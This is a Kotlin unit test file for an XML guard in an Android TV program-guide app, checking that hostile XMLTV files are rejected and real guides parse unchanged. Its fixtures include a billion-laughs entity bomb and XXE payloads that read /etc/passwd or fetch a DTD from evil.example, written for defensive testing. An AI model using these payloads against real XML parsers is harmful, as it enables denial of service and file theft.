// Copyright 2026 The tvBro authors
// SPDX-License-Identifier: Apache-2.0
package io.github.kmmarin.tvbro.data

import org.junit.Assert.*
import org.junit.Test
import org.kxml2.io.KXmlParser
import java.io.ByteArrayInputStream
import java.io.InputStream

/** Hostile guides (billion laughs, external entities) are refused before the parser sees them; real XMLTV passes. */
class XmlGuardTest {
    private fun s(x: String): InputStream = ByteArrayInputStream(x.toByteArray(Charsets.UTF_8))
    private fun refused(x: String) = try { XmlGuard.check(s(x)); false } catch (e: XmlRejected) { true }

    private val billionLaughs = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol9 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<tv><programme channel="a" start="20260101000000 +0000" stop="20260101010000 +0000"><title>&lol9;</title></programme></tv>"""

    private val good = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE tv SYSTEM "xmltv.dtd">
<!-- generated -->
<tv generator-info-name="x">
  <channel id="one"><display-name>One</display-name></channel>
  <programme channel="one" start="20260101100000 +0000" stop="20260101110000 +0000"><title>News</title></programme>
</tv>"""

    @Test fun billionLaughsIsRefused() = assertTrue(refused(billionLaughs))

    @Test fun externalEntityIsRefused() {
        assertTrue(refused("""<?xml version="1.0"?><!DOCTYPE tv [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><tv><x>&xxe;</x></tv>"""))
        assertTrue(refused("""<!DOCTYPE tv [ <!ENTITY % p SYSTEM "http://evil.example/x.dtd"> %p; ]><tv/>"""))
        assertTrue(refused("""<!doctype tv [<!entity a "b">]><tv/>""")) // any case
    }

    @Test fun entityAfterACommentWithMarkupIsStillRefused() {
        assertTrue(refused("""<?xml version="1.0"?><!-- <tv> not the root --><!DOCTYPE tv [<!ENTITY a "x">]><tv/>"""))
        assertTrue(refused("""<!DOCTYPE tv [<!ATTLIST tv a CDATA "<x>"> <!ENTITY a "x">]><tv/>"""))
        assertTrue(refused("""<!ENTITY a "x"><tv/>"""))
    }

    @Test fun overlongPrologIsRefused() {
        assertTrue(refused("<?xml version=\"1.0\"?><!-- " + "x".repeat(XmlGuard.LIMIT) + " --><tv/>"))
        assertTrue(refused(" ".repeat(XmlGuard.LIMIT + 10) + "<tv/>"))
    }

    @Test fun utf16EntityIsRefused() {
        val b = "﻿<!DOCTYPE tv [<!ENTITY a \"x\">]><tv/>".toByteArray(Charsets.UTF_16BE)
        assertThrows(XmlRejected::class.java) { XmlGuard.check(ByteArrayInputStream(b)) }
    }

    @Test fun realGuidePassesAndParsesFromTheGuardedStream() {
        val p = KXmlParser(); p.setInput(XmlGuard.check(s(good)), null)
        val got = ArrayList<Programme>()
        XmltvParser.parse(p, { ch, _ -> "k|$ch" }, 0, Long.MAX_VALUE) { got += it }
        assertEquals(listOf("News"), got.map { it.title })
    }

    @Test fun bigGuideKeepsEveryByteAfterTheCheck() {
        val big = good.replace("</tv>", (1..5000).joinToString("") { "<programme channel=\"one\" start=\"20260101100000 +0000\" stop=\"20260101110000 +0000\"><title>T$it</title></programme>" } + "</tv>")
        val back = XmlGuard.check(s(big)).readBytes().toString(Charsets.UTF_8)
        assertEquals(big, back)
    }

    @Test fun shortAndEmptyDocumentsAreLeftToTheParser() {
        XmlGuard.check(s(""))
        XmlGuard.check(s("<tv/>"))
        XmlGuard.check(s("<?xml version=\"1.0\"?>")) // complete, no root: the parser reports it
    }
}
